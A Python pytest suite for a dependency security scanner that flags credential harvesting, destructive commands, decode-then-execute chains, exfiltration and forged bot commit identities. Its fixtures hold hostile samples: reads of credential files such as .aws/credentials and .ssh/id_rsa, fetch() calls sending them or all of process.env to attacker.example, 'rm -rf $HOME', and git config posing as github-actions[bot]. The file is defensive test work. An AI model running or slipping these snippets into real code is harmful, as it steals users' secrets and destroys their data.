"""Tests for PayloadBehaviorScanner — credential harvest, destructive sinks,
decode-then-execute, exfil co-location, env scraping, and identity-forge (PB-01..PB-07)."""

from __future__ import annotations

from pathlib import Path

import pytest

from depfence.core.models import Severity
from depfence.scanners.payload_behavior_scanner import PayloadBehaviorScanner


@pytest.fixture
def scanner() -> PayloadBehaviorScanner:
    return PayloadBehaviorScanner()


def _analyze(scanner: PayloadBehaviorScanner, content: str, rel: str = "scripts/payload.js") -> list:
    return scanner._analyze(content, rel)


class TestCredentialStoreBreadth:
    def test_eight_stores_flagged_critical(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const aws = readFile('.aws/credentials');
        const kube = readFile('.kube/config');
        const docker = readFile('.docker/config.json');
        const npm = readFile('.npmrc');
        const gcloud = readFile('.config/gcloud');
        const ssh = readFile('.ssh/id_rsa');
        const netrc = readFile('.netrc');
        const gh = readFile('.config/gh/hosts.yml');
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL and "breadth" in f.title.lower() for f in findings)

    def test_two_stores_not_flagged(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const aws = readFile('.aws/credentials');
        const kube = readFile('.kube/config');
        """
        findings = _analyze(scanner, content)
        assert not any("breadth" in f.title.lower() for f in findings)

    def test_clean_file_no_findings(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const express = require('express');
        const app = express();
        app.get('/', (req, res) => res.send('Hello World'));
        app.listen(3000);
        """
        assert _analyze(scanner, content) == []


class TestDestructiveSinks:
    def test_rm_rf_home_critical(self, scanner: PayloadBehaviorScanner) -> None:
        findings = _analyze(scanner, "rm -rf $HOME")
        assert any(f.severity == Severity.CRITICAL and "destructive" in f.title.lower() for f in findings)

    def test_plain_rm_not_flagged(self, scanner: PayloadBehaviorScanner) -> None:
        findings = _analyze(scanner, "rm somefile.txt")
        assert not any("destructive" in f.title.lower() for f in findings)


class TestDecodeThenExecute:
    def test_eval_atob_critical(self, scanner: PayloadBehaviorScanner) -> None:
        findings = _analyze(scanner, "eval(atob('cGF5bG9hZA=='))")
        assert any(f.severity == Severity.CRITICAL and "decode" in f.title.lower() for f in findings)

    def test_child_process_decode_chain_critical(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const { exec } = require('child_process');
        exec(Buffer.from(encoded, 'base64').toString());
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL and "child" in f.title.lower() for f in findings)

    def test_plain_buffer_usage_not_flagged(self, scanner: PayloadBehaviorScanner) -> None:
        findings = _analyze(scanner, "const buf = Buffer.from('hello world', 'utf8');")
        assert not any("decode" in f.title.lower() for f in findings)


class TestHarvestExfilColocation:
    def test_creds_plus_fetch_critical(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const aws = fs.readFileSync('.aws/credentials');
        const kube = fs.readFileSync('.kube/config');
        const docker = fs.readFileSync('.docker/config.json');
        const npmrc = fs.readFileSync('.npmrc');
        fetch('https://attacker.example/collect', {
            method: 'POST',
            body: JSON.stringify({ aws, kube, docker, npmrc })
        });
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL and "exfil" in f.title.lower() for f in findings)

    def test_few_creds_with_exfil_not_flagged(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const aws = fs.readFileSync('.aws/credentials');
        const kube = fs.readFileSync('.kube/config');
        fetch('https://example.com/data', { method: 'POST' });
        """
        findings = _analyze(scanner, content)
        assert not any("harvest" in f.title.lower() and "exfil" in f.title.lower() for f in findings)


class TestEnvTokenScrape:
    def test_mass_scrape_plus_exfil_critical(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const all = JSON.stringify(process.env);
        fetch('https://attacker.example/', { method: 'POST', body: all });
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL and "mass-scrape" in f.title.lower() for f in findings)

    def test_bulk_token_access_without_exfil_high(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const a = process.env.GITHUB_TOKEN;
        const b = process.env.AWS_SECRET_KEY;
        const c = process.env.NPM_AUTH_TOKEN;
        const d = process.env.DOCKER_PASSWORD;
        const e = process.env.SLACK_BOT_TOKEN;
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.HIGH and "bulk" in f.title.lower() for f in findings)

    def test_few_token_reads_not_flagged(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        const token = process.env.GITHUB_TOKEN;
        const key = process.env.API_KEY;
        """
        findings = _analyze(scanner, content)
        assert not any("bulk" in f.title.lower() for f in findings)


class TestIdentityForge:
    def test_bot_identity_plus_push_critical(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        git config user.email "github-actions@users.noreply.github.com"
        git config user.name "github-actions[bot]"
        git push origin main
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL and "identity" in f.title.lower() for f in findings)

    def test_real_identity_plus_push_not_flagged(self, scanner: PayloadBehaviorScanner) -> None:
        content = """
        git config user.email "alice@example.com"
        git config user.name "Alice"
        git push origin main
        """
        findings = _analyze(scanner, content)
        assert not any("identity" in f.title.lower() for f in findings)


class TestScanProject:
    async def test_scan_project_detects_real_payload_file(self, scanner: PayloadBehaviorScanner, tmp_path: Path) -> None:
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "harvest.js").write_text("""
        const a = fs.readFileSync('.aws/credentials');
        const b = fs.readFileSync('.kube/config');
        const c = fs.readFileSync('.docker/config.json');
        const d = fs.readFileSync('.npmrc');
        const e = fs.readFileSync('.config/gcloud/application_default_credentials.json');
        fetch('https://attacker.example/drain', { method: 'POST', body: JSON.stringify({a,b,c,d,e}) });
        """)
        findings = await scanner.scan_project(tmp_path)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    async def test_scan_project_clean_tree_returns_empty(self, scanner: PayloadBehaviorScanner, tmp_path: Path) -> None:
        src = tmp_path / "src"
        src.mkdir()
        (src / "app.py").write_text(
            "def main():\n    print('Hello, world!')\n\nif __name__ == '__main__':\n    main()\n"
        )
        findings = await scanner.scan_project(tmp_path)
        assert findings == []
